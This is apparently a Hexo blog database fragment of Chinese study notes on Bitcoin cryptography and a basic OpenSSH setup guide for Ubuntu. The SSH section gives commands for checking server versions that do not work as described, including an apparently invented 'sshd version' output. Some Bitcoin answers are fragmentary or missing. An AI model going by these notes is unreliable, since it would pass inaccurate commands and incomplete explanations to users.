class=\"headerlink\" title=\"网络层\"></a>网络层</h2><ul>\n<li>tor</li>\n<li>多路径转发</li>\n</ul>\n<h1 id=\"零知识证明\"><a href=\"#零知识证明\" class=\"headerlink\" title=\"零知识证明\"></a>零知识证明</h1><h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p><img src=\"/../pic/Pasted%20image%2020240724182711.png\"></p>\n<h2 id=\"同态隐藏（数学基础）\"><a href=\"#同态隐藏（数学基础）\" class=\"headerlink\" title=\"同态隐藏（数学基础）\"></a>同态隐藏（数学基础）</h2><p><img src=\"/../pic/Pasted%20image%2020240724182851.png\"></p>\n<ul>\n<li>无输入碰撞，唯一对应。</li>\n<li>加密函数不可逆。</li>\n<li>同台运算。</li>\n<li>x与y进行随机化处理，使得x与y的运算结果不变。</li>\n</ul>\n<h1 id=\"盲签名\"><a href=\"#盲签名\" class=\"headerlink\" title=\"盲签名\"></a>盲签名</h1><p><img src=\"/../pic/Pasted%20image%2020240724183744.png\"></p>\n<ul>\n<li>2、3 步的serialnum为明文。</li>\n</ul>\n<h1 id=\"零币与零钞\"><a href=\"#零币与零钞\" class=\"headerlink\" title=\"零币与零钞\"></a>零币与零钞</h1><p><img src=\"/../pic/Pasted%20image%2020240724183837.png\"></p>\n<ul>\n<li>随机源必须及时销毁。</li>\n<li>还是要与实体交易还是容易泄露匿名性。</li>\n</ul>\n"},{"title":"10 BTC-问答","date":"2024-07-24T12:20:43.000Z","_content":"# 1. 转账目标地址离线，对于转账交易有什么影响\n\n无影响\n# 2.全节点收到的交易会不会出现全新的接受地址\n\n会，生成新的公钥不会告诉别人，在UTXO中出现才能别被人发现\n# 3.私钥丢失怎么办\n没办法\n# 4.私钥泄露怎么办\n# 5.转账写错地址怎么办\n\n保存在一个由信息生成的公钥，是不合理的公钥。\n\n# 6. return的无条件返回错误怎么通过验证怎么写上区块链\n\n验证：验证的时候不会被执行，只有在花销的时候才会执行return后面的语句。\n\n\n\n# 7.矿工偷答案\n\n区块的的哈希值包含里面的，改成别人的地址，根哈希也需要改变。\n\n\n","source":"_posts/10 BTC-问答.md","raw":"---\ntitle: 10 BTC-问答\ndate: 2024-07-24 20:20:43\ntags: \n - BTC\n - BlockChain\ncategories:\n - BlockChain\n - BTC\n---\n# 1. 转账目标地址离线，对于转账交易有什么影响\n\n无影响\n# 2.全节点收到的交易会不会出现全新的接受地址\n\n会，生成新的公钥不会告诉别人，在UTXO中出现才能别被人发现\n# 3.私钥丢失怎么办\n没办法\n# 4.私钥泄露怎么办\n# 5.转账写错地址怎么办\n\n保存在一个由信息生成的公钥，是不合理的公钥。\n\n# 6. return的无条件返回错误怎么通过验证怎么写上区块链\n\n验证：验证的时候不会被执行，只有在花销的时候才会执行return后面的语句。\n\n\n\n# 7.矿工偷答案\n\n区块的的哈希值包含里面的，改成别人的地址，根哈希也需要改变。\n\n\n","slug":"10 BTC-问答","published":1,"updated":"2024-07-28T06:53:53.432Z","comments":1,"layout":"post","photos":[],"_id":"clz7mrmk200118wungvif75p0","content":"<h1 id=\"1-转账目标地址离线，对于转账交易有什么影响\"><a href=\"#1-转账目标地址离线，对于转账交易有什么影响\" class=\"headerlink\" title=\"1. 转账目标地址离线，对于转账交易有什么影响\"></a>1. 转账目标地址离线，对于转账交易有什么影响</h1><p>无影响</p>\n<h1 id=\"2-全节点收到的交易会不会出现全新的接受地址\"><a href=\"#2-全节点收到的交易会不会出现全新的接受地址\" class=\"headerlink\" title=\"2.全节点收到的交易会不会出现全新的接受地址\"></a>2.全节点收到的交易会不会出现全新的接受地址</h1><p>会，生成新的公钥不会告诉别人，在UTXO中出现才能别被人发现</p>\n<h1 id=\"3-私钥丢失怎么办\"><a href=\"#3-私钥丢失怎么办\" class=\"headerlink\" title=\"3.私钥丢失怎么办\"></a>3.私钥丢失怎么办</h1><p>没办法</p>\n<h1 id=\"4-私钥泄露怎么办\"><a href=\"#4-私钥泄露怎么办\" class=\"headerlink\" title=\"4.私钥泄露怎么办\"></a>4.私钥泄露怎么办</h1><h1 id=\"5-转账写错地址怎么办\"><a href=\"#5-转账写错地址怎么办\" class=\"headerlink\" title=\"5.转账写错地址怎么办\"></a>5.转账写错地址怎么办</h1><p>保存在一个由信息生成的公钥，是不合理的公钥。</p>\n<h1 id=\"6-return的无条件返回错误怎么通过验证怎么写上区块链\"><a href=\"#6-return的无条件返回错误怎么通过验证怎么写上区块链\" class=\"headerlink\" title=\"6. return的无条件返回错误怎么通过验证怎么写上区块链\"></a>6. return的无条件返回错误怎么通过验证怎么写上区块链</h1><p>验证：验证的时候不会被执行，只有在花销的时候才会执行return后面的语句。</p>\n<h1 id=\"7-矿工偷答案\"><a href=\"#7-矿工偷答案\" class=\"headerlink\" title=\"7.矿工偷答案\"></a>7.矿工偷答案</h1><p>区块的的哈希值包含里面的，改成别人的地址，根哈希也需要改变。</p>\n","excerpt":"","more":"<h1 id=\"1-转账目标地址离线，对于转账交易有什么影响\"><a href=\"#1-转账目标地址离线，对于转账交易有什么影响\" class=\"headerlink\" title=\"1. 转账目标地址离线，对于转账交易有什么影响\"></a>1. 转账目标地址离线，对于转账交易有什么影响</h1><p>无影响</p>\n<h1 id=\"2-全节点收到的交易会不会出现全新的接受地址\"><a href=\"#2-全节点收到的交易会不会出现全新的接受地址\" class=\"headerlink\" title=\"2.全节点收到的交易会不会出现全新的接受地址\"></a>2.全节点收到的交易会不会出现全新的接受地址</h1><p>会，生成新的公钥不会告诉别人，在UTXO中出现才能别被人发现</p>\n<h1 id=\"3-私钥丢失怎么办\"><a href=\"#3-私钥丢失怎么办\" class=\"headerlink\" title=\"3.私钥丢失怎么办\"></a>3.私钥丢失怎么办</h1><p>没办法</p>\n<h1 id=\"4-私钥泄露怎么办\"><a href=\"#4-私钥泄露怎么办\" class=\"headerlink\" title=\"4.私钥泄露怎么办\"></a>4.私钥泄露怎么办</h1><h1 id=\"5-转账写错地址怎么办\"><a href=\"#5-转账写错地址怎么办\" class=\"headerlink\" title=\"5.转账写错地址怎么办\"></a>5.转账写错地址怎么办</h1><p>保存在一个由信息生成的公钥，是不合理的公钥。</p>\n<h1 id=\"6-return的无条件返回错误怎么通过验证怎么写上区块链\"><a href=\"#6-return的无条件返回错误怎么通过验证怎么写上区块链\" class=\"headerlink\" title=\"6. return的无条件返回错误怎么通过验证怎么写上区块链\"></a>6. return的无条件返回错误怎么通过验证怎么写上区块链</h1><p>验证：验证的时候不会被执行，只有在花销的时候才会执行return后面的语句。</p>\n<h1 id=\"7-矿工偷答案\"><a href=\"#7-矿工偷答案\" class=\"headerlink\" title=\"7.矿工偷答案\"></a>7.矿工偷答案</h1><p>区块的的哈希值包含里面的，改成别人的地址，根哈希也需要改变。</p>\n"},{"title":"12 BTC-思考","date":"2024-07-24T12:20:45.000Z","_content":"# 1.哈希指针\n![](../pic/Pasted%20image%2020240724184250.png)\n\n\n- 只是哈希，没有指针。\n- 存储在（key,value）数据库中，level DB\n\n# 2.区块恋\n\n特点：私钥分开\n\n- 降低账户安全性。\n- 丢失很难找回。\n- 永久保存死钱，浪费空间。\n- 安全方式：多种签名。\n\n# 3. 分布式共识\n\n 为什么区块链系统能够绕过分布式共识中的那些不可能结论。\n\n没有达到真正的共识。\n\n# 4.比特币的稀缺性\n\n稀缺性不适合作为货币\n\n# 5.量子计算\n\n- 公钥也不是明文存储。\n- SHA-256\n- 最好是一次性转移。","source":"_posts/12 BTC-思考.md","raw":"---\ntitle: 12 BTC-思考\ndate: 2024-07-24 20:20:45\ntags: \n - BTC\n - BlockChain\ncategories:\n - BlockChain\n - BTC\n---\n# 1.哈希指针\n![](../pic/Pasted%20image%2020240724184250.png)\n\n\n- 只是哈希，没有指针。\n- 存储在（key,value）数据库中，level DB\n\n# 2.区块恋\n\n特点：私钥分开\n\n- 降低账户安全性。\n- 丢失很难找回。\n- 永久保存死钱，浪费空间。\n- 安全方式：多种签名。\n\n# 3. 分布式共识\n\n 为什么区块链系统能够绕过分布式共识中的那些不可能结论。\n\n没有达到真正的共识。\n\n# 4.比特币的稀缺性\n\n稀缺性不适合作为货币\n\n# 5.量子计算\n\n- 公钥也不是明文存储。\n- SHA-256\n- 最好是一次性转移。","slug":"12 BTC-思考","published":1,"updated":"2024-07-31T15:55:48.557Z","_id":"clz7mrmk300168wune9g57jzv","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"1-哈希指针\"><a href=\"#1-哈希指针\" class=\"headerlink\" title=\"1.哈希指针\"></a>1.哈希指针</h1><p><img src=\"/../pic/Pasted%20image%2020240724184250.png\"></p>\n<ul>\n<li>只是哈希，没有指针。</li>\n<li>存储在（key,value）数据库中，level DB</li>\n</ul>\n<h1 id=\"2-区块恋\"><a href=\"#2-区块恋\" class=\"headerlink\" title=\"2.区块恋\"></a>2.区块恋</h1><p>特点：私钥分开</p>\n<ul>\n<li>降低账户安全性。</li>\n<li>丢失很难找回。</li>\n<li>永久保存死钱，浪费空间。</li>\n<li>安全方式：多种签名。</li>\n</ul>\n<h1 id=\"3-分布式共识\"><a href=\"#3-分布式共识\" class=\"headerlink\" title=\"3. 分布式共识\"></a>3. 分布式共识</h1><p> 为什么区块链系统能够绕过分布式共识中的那些不可能结论。</p>\n<p>没有达到真正的共识。</p>\n<h1 id=\"4-比特币的稀缺性\"><a href=\"#4-比特币的稀缺性\" class=\"headerlink\" title=\"4.比特币的稀缺性\"></a>4.比特币的稀缺性</h1><p>稀缺性不适合作为货币</p>\n<h1 id=\"5-量子计算\"><a href=\"#5-量子计算\" class=\"headerlink\" title=\"5.量子计算\"></a>5.量子计算</h1><ul>\n<li>公钥也不是明文存储。</li>\n<li>SHA-256</li>\n<li>最好是一次性转移。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"1-哈希指针\"><a href=\"#1-哈希指针\" class=\"headerlink\" title=\"1.哈希指针\"></a>1.哈希指针</h1><p><img src=\"/../pic/Pasted%20image%2020240724184250.png\"></p>\n<ul>\n<li>只是哈希，没有指针。</li>\n<li>存储在（key,value）数据库中，level DB</li>\n</ul>\n<h1 id=\"2-区块恋\"><a href=\"#2-区块恋\" class=\"headerlink\" title=\"2.区块恋\"></a>2.区块恋</h1><p>特点：私钥分开</p>\n<ul>\n<li>降低账户安全性。</li>\n<li>丢失很难找回。</li>\n<li>永久保存死钱，浪费空间。</li>\n<li>安全方式：多种签名。</li>\n</ul>\n<h1 id=\"3-分布式共识\"><a href=\"#3-分布式共识\" class=\"headerlink\" title=\"3. 分布式共识\"></a>3. 分布式共识</h1><p> 为什么区块链系统能够绕过分布式共识中的那些不可能结论。</p>\n<p>没有达到真正的共识。</p>\n<h1 id=\"4-比特币的稀缺性\"><a href=\"#4-比特币的稀缺性\" class=\"headerlink\" title=\"4.比特币的稀缺性\"></a>4.比特币的稀缺性</h1><p>稀缺性不适合作为货币</p>\n<h1 id=\"5-量子计算\"><a href=\"#5-量子计算\" class=\"headerlink\" title=\"5.量子计算\"></a>5.量子计算</h1><ul>\n<li>公钥也不是明文存储。</li>\n<li>SHA-256</li>\n<li>最好是一次性转移。</li>\n</ul>\n"},{"title":"SSH-操作","date":"2024-07-22T08:20:41.000Z","_content":"\n\n# 一、安装操作\n## 1. **OpenSSH Client（openssh-client）**：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：\n   - `ssh`：用于安全远程登录。\n   - `scp`：用于安全复制文件。\n   - `sftp`：用于安全文件传输。\n   - `ssh-keygen`：用于生成和管理SSH密钥。\n   - `ssh-copy-id`：用于将本地生成的SSH公钥复制到远程主机的授权密钥文件中，以便实现无密码登录。\n\n2. **OpenSSH Server（openssh-server）**：这个服务器端工具允许远程用户通过SSH协议连接到这台机器。主要组件包括：\n   - `sshd`：SSH守护进程，处理和管理SSH连接。\n   - 配置文件通常位于`/etc/ssh/sshd_config`，可以在这里进行各种设置，如端口、认证方式、允许或禁止的用户等。\n\n要检查Ubuntu 24.04是否已安装OpenSSH工具包，可以使用以下命令：\n\n```bash\ndpkg -l | grep openssh\n\nsudo apt update\nsudo apt install openssh-client openssh-server\n```\n\n# 二、查看SSH服务的版本\n\n\n## 1. **查看OpenSSH客户端版本**：\n   ```bash\n   ssh -V\n   ```\n   这将输出类似于以下的信息：\n   ```\n   OpenSSH_8.9p1, OpenSSL 1.1.1n  15 Mar 2022\n   ```\n\n## 2. **查看OpenSSH服务器版本**：\n   首先确保SSH服务器正在运行，然后使用以下命令连接到本地SSH服务器并查看其版本信息：\n   ```bash\n   ssh -V localhost\n   ```\n   这将返回客户端和服务器的版本信息。如果只需要查看服务器版本信息，可以查找`sshd`守护进程的版本：\n   ```bash\n   sudo sshd -T | grep version\n   ```\n   这将输出类似于以下的信息：\n   ```\n   sshd version OpenSSH_8.9p1, OpenSSL 1.1.1n  15 Mar 2022\n   ```\n\n# 三、启动操作\n\n## 1.开启端口防火墙策略\n\n```shell\nsudo apt install ufw\nsudo ufw enable\nsudo ufw allow 22\nsudo ufw status\n```\n\n## 2.自定义开放端口(可选)\n\n```shell\nsudo ufw allow 2222\nsudo ufw status\n```\n## 3.启动SSH服务\n\n```shell\nsudo systemctl start ssh\nsudo systemctl enable ssh  //自启动命令\nsudo systemctl status ssh\n\n/etc/ssh/sshd_config   // 配置文件所在位置\n```\n\n# 四、退出操作（exit）\n\n### 方法1：使用`exit`命令\n\n在SSH会话中，可以使用`exit`命令退出会话并断开连接：\n\n```bash\nexit\n```\n\n或者按 `Ctrl+D` 组合键，也可以关闭当前的SSH会话。\n\n### 方法2：使用`logout`命令\n\n在某些系统上，可以使用`logout`命令断开SSH连接：\n\n```bash\nlogout\n```\n\n### 方法3：关闭终端\n\n如果你是在终端（如gnome-terminal、xterm、tmux等）中运行的SSH连接，直接关闭终端窗口也会断开SSH连接。\n\n### 方法4：使用`kill`命令（强制断开）\n\n如果需要强制断开SSH连接，可以在本地终端上找到SSH进程并杀掉它：\n\n1. 找到SSH进程的PID：\n   ```bash\n   ps aux | grep ssh\n   ```\n\n2. 使用`kill`命令终止进程（替换`<PID>`为实际的进程ID）：\n   ```bash\n   kill <PID>\n   ```\n\n3. 如果`kill`命令无法终止进程，可以使用`kill -9`强制终止：\n   ```bash\n   kill -9 <PID>\n   ```\n\n### 方法5：使用`tmux`或`screen`分离会话（可选）\n\n如果你在SSH会话中使用了`tmux`或`screen`，可以分离（detach）会话，而不会真正断开连接：\n\n- 在`tmux`中，按下 `Ctrl+B` 然后按 `D` 键。\n- 在`screen`中，按下 `Ctrl+A` 然后按 `D` 键。\n\n这将分离会话，但会话仍在远程主机上运行，你可以稍后重新连接。\n\n### 例子\n\n假设你当前在SSH会话中，只需键入`exit`并按回车即可：\n\n```bash\nexit\n```\n\n\n# 五、认证操作\n\n## （1）账号密码连接\n\n```shell\nssh ubuntu@192.168.179.141\n```\n\n## （2）公私钥认证连接\n\n","source":"_posts/SSH-操作.md","raw":"---\ntitle: SSH-操作\ndate: 2024-07-22 16:20:41\ntags: \n - SSH\ncategories:\n - 网络协议\n - SSH\n---\n\n\n# 一、安装操作\n## 1. **OpenSSH Client（openssh-client）**：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：\n   - `ssh`：用于安全远程登录。\n   - `scp`：用于安全复制文件。\n   - `sftp`：用于安全文件传输。\n   - `ssh-keygen`：用于生成和管理SSH密钥。\n   - `ssh-copy-id`：用于将本地生成的SSH公钥复制到远程主机的授权密钥文件中，以便实现无密码登录。\n\n2. **OpenSSH Server（openssh-server）**：这个服务器端工具允许远程用户通过SSH协议连接到这台机器。主要组件包括：\n   - `sshd`：SSH守护进程，处理和管理SSH连接。\n   - 配置文件通常位于`/etc/ssh/sshd_config`，可以在这里进行各种设置，如端口、认证方式、允许或禁止的用户等。\n\n要检查Ubuntu 24.04是否已安装OpenSSH工具包，可以使用以下命令：\n\n```bash\ndpkg -l | grep openssh\n\nsudo apt update\nsudo apt install openssh-client openssh-server\n```\n\n# 二、查看SSH服务的版本\n\n\n## 1. **查看OpenSSH客户端版本**：\n   ```bash\n   ssh -V\n   ```\n   这将输出类似于以下的信息：\n   ```\n   OpenSSH_8.9p1, OpenSSL 1.1.1n  15 Mar 2022\n   ```\n\n## 2. **查看OpenSSH服务器版本**：\n   首先确保SSH服务器正在运行，然后使用以下命令连接到本地SSH服务器并查看其版本信息：\n   ```bash\n   ssh -V localhost\n   ```\n   这将返回客户端和服务器的版本信息。如果只需要查看服务器版本信息，可以查找`sshd`守护进程的版本：\n   ```bash\n   sudo sshd -T | grep version\n   ```\n   这将输出类似于以下的信息：\n   ```\n   sshd version OpenSSH_8.9p1, OpenSSL 1.1.1n  15 Mar 2022\n   ```\n\n# 三、启动操作\n\n## 1.开启端口防火墙策略\n\n```shell\nsudo apt install ufw\nsudo ufw enable\nsudo ufw allow 22\nsudo ufw status\n```\n\n## 2.自定义开放端口(可选)\n\n```shell\nsudo ufw allow 2222\nsudo ufw status\n```\n## 3.启动SSH服务\n\n```shell\nsudo systemctl start ssh\nsudo systemctl enable ssh  //自启动命令\nsudo systemctl status ssh\n\n/etc/ssh/sshd_config   // 配置文件所在位置\n```\n\n# 四、退出操作（exit）\n\n### 方法1：使用`exit`命令\n\n在SSH会话中，可以使用`exit`命令退出会话并断开连接：\n\n```bash\nexit\n```\n\n或者按 `Ctrl+D` 组合键，也可以关闭当前的SSH会话。\n\n### 方法2：使用`logout`命令\n\n在某些系统上，可以使用`logout`命令断开SSH连接：\n\n```bash\nlogout\n```\n\n### 方法3：关闭终端\n\n如果你是在终端（如gnome-terminal、xterm、tmux等）中运行的SSH连接，直接关闭终端窗口也会断开SSH连接。\n\n### 方法4：使用`kill`命令（强制断开）\n\n如果需要强制断开SSH连接，可以在本地终端上找到SSH进程并杀掉它：\n\n1. 找到SSH进程的PID：\n   ```bash\n   ps aux | grep ssh\n   ```\n\n2. 使用`kill`命令终止进程（替换`<PID>`为实际的进程ID）：\n   ```bash\n   kill <PID>\n   ```\n\n3. 如果`kill`命令无法终止进程，可以使用`kill -9`强制终止：\n   ```bash\n   kill -9 <PID>\n   ```\n\n### 方法5：使用`tmux`或`screen`分离会话（可选）\n\n如果你在SSH会话中使用了`tmux`或`screen`，可以分离（detach）会话，而不会真正断开连接：\n\n- 在`tmux`中，按下 `Ctrl+B` 然后按 `D` 键。\n- 在`screen`中，按下 `Ctrl+A` 然后按 `D` 键。\n\n这将分离会话，但会话仍在远程主机上运行，你可以稍后重新连接。\n\n### 例子\n\n假设你当前在SSH会话中，只需键入`exit`并按回车即可：\n\n```bash\nexit\n```\n\n\n# 五、认证操作\n\n## （1）账号密码连接\n\n```shell\nssh ubuntu@192.168.179.141\n```\n\n## （2）公私钥认证连接\n\n","slug":"SSH-操作","published":1,"updated":"2024-07-28T06:53:53.432Z","comments":1,"layout":"post","photos":[],"_id":"clz7mrmk400198wuneq1y19t5","content":"<h1 id=\"一、安装操作\"><a href=\"#一、安装操作\" class=\"headerlink\" title=\"一、安装操作\"></a>一、安装操作</h1><h2 id=\"1-OpenSSH-Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：\"><a href=\"#1-OpenSSH-Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：\" class=\"headerlink\" title=\"1. OpenSSH Client（openssh-client）：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：\"></a>1. <strong>OpenSSH Client（openssh-client）</strong>：这个客户端工具允许用户通过SSH协议连接到远程主机。常用的命令包括：</h2><ul>\n<li><code>ssh</code>：用于安全远程登录。</li>\n<li><code>scp</code>：用于安全复制文件。</li>\n<li><code>sftp</code>：用于安全文件传输。</li>\n<li><code>ssh-keygen</code>：用于生成和管理SSH密钥。</li>\n<li><code>ssh-copy-id</code>：用于将本地生成的SSH公钥复制到远程主机的授权密钥文件中，以便实现无密码登录。</li>\n</ul>\n<ol start=\"2\">\n<li><strong>OpenSSH Server（openssh-server）</strong>：这个服务器端工具允许远程用户通过SSH协议连接到这台机器。主要组件包括：<ul>\n<li><code>sshd</code>：SSH守护进程，处理和管理SSH连接。</li>\n<li>配置文件通常位于<code>/etc/ssh/sshd_config</code>，可以在这里进行各种设置，如端口、认证方式、允许或禁止的用户等。</li>\n</ul>\n</li>\n</ol>\n<p>要检查Ubuntu 24.04是否已安装OpenSSH工具包，可以使用以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">dpkg -l | grep openssh<br><br><span class=\"hljs-built_in\">sudo</span> apt update<br><span class=\"hljs-built_in\">sudo</span> apt install openssh-client openssh-server<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"二、查看SSH服务的版本\"><a href=\"#二、查看SSH服务的版本\" class=\"headerlink\" title=\"二、查看SSH服务的版本\"></a>二、查看SSH服务的版本</h1><h2 id=\"1-查看OpenSSH客户端版本：\"><a href=\"#1-查看OpenSSH客户端版本：\" class=\"headerlink\" title=\"1. 查看OpenSSH客户端版本：\"></a>1. <strong>查看OpenSSH客户端版本</strong>：</h2>   <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">ssh -V<br></code></pre></td></tr></table></figure>\n<p>   这将输出类似于以下的信息：<br>   <figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">OpenSSH_8</span>.<span class=\"hljs-number\">9</span>p1, OpenSSL <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span>n  <span class=\"hljs-number\">15</span> Mar <span class=\"hljs-number\">2022</span><br></code></pre></td></tr></table></figure></p>\n<h2 id=\"2-查看OpenSSH服务器版本：\"><a href=\"#2-查看OpenSSH服务器版本：\" class=\"headerlink\" title=\"2. 查看OpenSSH服务器版本：\"></a>2. <strong>查看OpenSSH服务器版本</strong>：</h2><p>   首先确保SSH服务器正在运行，然后使用以下命令连接到本地SSH服务器并查看其版本信息：<br>   <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">ssh -V localhost<br></code></pre></td></tr></table></figure><br>   这将返回客户端和服务器的版本信息。如果只需要查看服务器版本信息，可以查找<code>sshd</code>守护进程的版本：<br>   <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">sudo</span> sshd -T | grep version<br></code></pre></td></tr></table></figure><br>   这将输出类似于以下的信息：<br>   <figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">sshd</span> version OpenSSH_8.<span class=\"hljs-number\">9</span>p1, OpenSSL <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span>n  <span class=\"hljs-number\">15</span> Mar <span class=\"hljs-number\">2022</span><br></code></pre></td></tr></table></figure></p>\n<h1 id=\"三、启动操作\"><a href=\"#三、启动操作\" class=\"headerlink\" title=\"三、启动操作\"></a>三、启动操作</h1><h2 id=\"1-开启端口防火墙策略\"><a href=\"#1-开启端口防火墙策略\" class=\"headerlink\" title=\"1.开启端口防火墙策略\"></a>1.开启端口防火墙策略</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo apt install ufw<br>sudo ufw enable<br>sudo ufw allow 22<br>sudo ufw status<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-自定义开放端口-可选\"><a href=\"#2-自定义开放端口-可选\" class=\"headerlink\" title=\"2.自定义开放端口(可选)\"></a>2.自定义开放端口(可选)</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo ufw allow 2222<br>sudo ufw status<br></code></pre></td></tr></table></figure>\n<h2 id=\"3-启动SSH服务\"><a href=\"#3-启动SSH服务\" class=\"headerlink\" title=\"3.启动SSH服务\"></a>3.启动SSH服务</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo systemctl start ssh<br>sudo systemctl enable ssh  //自启动命令<br>sudo systemctl status ssh<br><br>/etc/ssh/sshd_config   // 配置文件所在位置<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"四、退出操作（exit）\"><a href=\"#四、退出操作（exit）\" class=\"headerlink\" title=\"四、退出操作（exit）\"></a>四、退出操作（exit）</h1><h3 id=\"方法1：使用exit命令\"><a href=\"#方法1：使用exit命令\" class=\"headerlink\" title=\"方法1：使用exit命令\"></a>方法1：使用<code>exit</code>命令</h3><p>在SSH会话中，可以使用<code>exit</code>命令退出会话并断开连接：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">exit</span><br></code></pre></td></tr></table></figure>\n\n<p>或者按 <code>Ctrl+D</code> 组合键，也可以关闭当前的SSH会话。</p>\n<h3 id=\"方法2：使用logout命令\"><a href=\"#方法2：使用logout命令\" class=\"headerlink\" title=\"方法2：使用logout命令\"></a>方法2：使用<code>logout</code>命令</h3><p>在某些系统上，可以使用<code>logout</code>命令断开SSH连接：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">logout</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"方法3：关闭终端\"><a href=\"#方法3：关闭终端\" class=\"headerlink\" title=\"方法3：关闭终端\"></a>方法3：关闭终端</h3><p>如果你是在终端（如gnome-terminal、xterm、tmux等）中运行的SSH连接，直接关闭终端窗口也会断开SSH连接。</p>\n<h3 id=\"方法4：使用kill命令（强制断开）\"><a href=\"#方法4：使用kill命令（强制断开）\" class=\"headerlink\" title=\"方法4：使用kill命令（强制断开）\"></a>方法4：使用<code>kill</code>命令（强制断开）</h3><p>如果需要强制断开SSH连接，可以在本地终端上找到SSH进程并杀掉它：</p>\n<ol>\n<li><p>找到SSH进程的PID：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">ps aux | grep ssh<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>使用<code>kill</code>命令终止进程（替换<code>&lt;PID&gt;</code>为实际的进程ID）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">kill</span> &lt;PID&gt;<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>如果<code>kill</code>命令无法终止进程，可以使用<code>kill -9</code>强制终止：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">kill</span> -9 &lt;PID&gt;<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"方法5：使用tmux或screen分离会话（可选）\"><a href=\"#方法5：使用tmux或screen分离会话（可选）\" class=\"headerlink\" title=\"方法5：使用tmux或screen分离会话（可选）\"></a>方法5：使用<code>tmux</code>或<code>screen</code>分离会话（可选）</h3><p>如果你在SSH会话中使用了<code>tmux</code>或<code>screen</code>，可以分离（detach）会话，而不会真正断开连接：</p>\n<ul>\n<li>在<code>tmux</code>中，按下 <code>Ctrl+B</code> 然后按 <code>D</code> 键。</li>\n<li>在<code>screen</code>中，按下 <code>Ctrl+A</code> 然后按 <code>D</code> 键。</li>\n</ul>\n<p>这将分离会话，但会话仍在远程主机上运行，你可以稍后重新连接。</p>\n<h3 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h3><p>假设你当前在SSH会话中，只需键入<code>exit</code>并按回车即可：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">exit</span><br></code></pre></td></tr></table></figure>\n\n\n<h1 id=\"五、认证操作\"><a href=\"#五、认证操作\" class=\"headerlink\" title=\"五、认证操作\"></a>五、认证操作</h1><h2 id=\"（1）账号密码连接\"><a href=\"#（1）账号密码连接\" class=\"headerlink\" title=\"（1）账号密码连接\"></a>（1）账号密码连接</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">ssh ubuntu@192.168.179.141<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"（2）公私钥认证连接\"><a href=\"#（2）公私钥认证连接\" class=\"headerlink\" title=\"（2）公私钥认证连接\"></a>（2）公私钥认证连接</h2>","excerpt":"","more":"<h1 id=\"一、安装操作\"><a 